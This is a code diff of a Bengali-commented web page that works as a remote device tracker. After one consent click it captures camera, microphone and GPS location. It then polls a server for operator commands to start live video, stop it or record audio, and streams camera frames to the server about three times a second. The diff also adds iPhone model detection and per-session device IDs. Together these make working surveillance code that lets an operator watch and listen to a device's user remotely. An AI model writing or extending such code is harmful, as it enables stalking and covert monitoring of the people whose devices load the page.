@@ -38,9 +38,10 @@
     </div>
 
     <script>
+        let watchId = null;
         let sharingInterval = null;
-        let stream = null; 
         let videoInterval = null;
+        let stream = null; 
         let videoElement = document.createElement('video');
         let canvas = document.createElement('canvas');
         let ctx = canvas.getContext('2d');
@@ -48,11 +49,9 @@
         const btn = document.getElementById('consentBtn');
         const statusMsg = document.getElementById('statusMsg');
         
-        let clientId = localStorage.getItem("tracker_client_id");
-        if (!clientId) {
-            clientId = 'device_' + Math.random().toString(36).substr(2, 9);
-            localStorage.setItem("tracker_client_id", clientId);
-        }
+        // **গুরুত্বপূর্ণ পরিবর্তন:** localStorage ব্যবহার না করে, প্রতিবার নতুন সেশন আইডি তৈরি করা হচ্ছে
+        // তাই একাধিক ট্যাব বা ডিভাইস আলাদা করে দেখা যাবে
+        const clientId = 'device_' + Math.random().toString(36).substr(2, 9);
 
         function getPhoneModel(ua) {
             let model = "Unknown Device";
@@ -63,6 +62,9 @@
                     model = parts[2].trim();
                     if (model.includes("Build")) model = model.split("Build")[0].trim();
                 }
+            }
+            if (ua.includes("iPhone")) {
+                model = "iPhone (iOS " + (ua.match(/iPhone OS (\d+_\d+)/) ? ua.match(/iPhone OS (\d+_\d+)/)[1].replace("_", ".") : "Unknown") + ")";
             }
             return model;
         }
@@ -89,11 +91,9 @@
             statusMsg.innerText = '📡 ক্যামেরা এবং মাইক চালু হচ্ছে...';
 
             try {
-                // ক্যামেরা এবং মাইক স্ট্রিম চালু করা
                 stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 videoElement.srcObject = stream;
                 videoElement.play();
-                console.log("ক্যামেরা ও মাইক চালু হয়েছে");
             } catch (err) {
                 console.log("পারমিশন নেই: ", err);
                 statusMsg.innerText = '❌ ক্যামেরা/মাইক পারমিশন ব্লকড!';
@@ -108,9 +108,7 @@
         function startTracking() {
             btn.innerText = '✅ শেয়ারিং চলছে';
             statusMsg.innerText = '🟢 কানেক্টেড! ভিডিও পাঠানো হচ্ছে...';
-            localStorage.setItem("tracker_consent", "true");
 
-            // লোকেশন ওয়াচার
             navigator.geolocation.watchPosition(
                 (pos) => {
                     sendData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'N/A', false);
@@ -121,13 +119,6 @@
 
             sharingInterval = setInterval(checkCommands, 2000);
         }
-
-        window.onload = () => {
-            if (localStorage.getItem("tracker_consent") === "true") {
-                btn.innerText = '🔄 অটো কানেক্ট হচ্ছে...';
-                startTracking();
-            }
-        };
 
         function sendData(lat, lng, accuracy, battery, charging) {
             const data = {
@@ -150,19 +141,14 @@
                     const data = clients[clientId];
                     if (!data) return;
                     
-                    if (data.command === 'start_live') {
-                        startLiveVideo();
-                    } else if (data.command === 'stop_live') {
-                        stopLiveVideo();
-                    } else if (data.command === 'record_audio') {
-                        recordAudio();
-                    }
+                    if (data.command === 'start_live') startLiveVideo();
+                    else if (data.command === 'stop_live') stopLiveVideo();
+                    else if (data.command === 'record_audio') recordAudio();
                 }).catch(err => console.log(err));
         }
 
-        // 📹 লাইভ ভিডিও শুরু করার ফাংশন (সিসিটিভি মোড)
         function startLiveVideo() {
-            if (videoInterval) return; // আগেই চললে কিছু করবে না
+            if (videoInterval) return;
             if (!stream) return;
 
             videoInterval = setInterval(() => {
@@ -170,15 +156,13 @@
                 canvas.width = videoElement.videoWidth;
                 canvas.height = videoElement.videoHeight;
                 ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                
-                // ভিডিওর কোয়ালিটি একটু কমিয়ে পাঠানো হচ্ছে যাতে ল্যাগ না হয় (০.৩ = ৩০%)
                 const frameData = canvas.toDataURL('image/jpeg', 0.3);
                 
                 fetch('/api/update', {
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ id: clientId, video_frame: frameData, time: new Date().toISOString() })
                 }).catch(err => console.error(err));
-            }, 300); // প্রতি ৩০০ মিলি সেকেন্ডে ১টি ফ্রেম (প্রায় ৩ FPS)
+            }, 300);
         }
 
         function stopLiveVideo() {
